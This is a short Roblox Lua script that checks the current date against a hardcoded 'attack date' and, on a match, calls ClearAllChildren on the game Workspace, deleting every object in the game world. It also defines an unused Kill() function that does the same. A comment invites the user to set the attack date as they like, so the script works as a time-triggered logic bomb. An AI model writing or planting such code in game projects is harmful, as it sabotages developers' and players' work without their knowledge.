local d = DateTime:now()
local acD = d:FormatUniversalTime("LL", "en-us");
local acM = d:FormatUniversalTime("MMM");
local acM2 = d:FormatUniversalTime("M");
local acDa = d:FormatUniversalTime("D");
local aD = "May 15, 2022"; -- This is the attack date (when the script runs), change to your convienence!! :)
local aM = "May";
local aM2 = 5;
local aDa = 12;
local w = game:GetService("Workspace");

function Kill()
	w:ClearAllChildren()
end

if aD == acD then
	w:ClearAllChildren()
end

print(acD)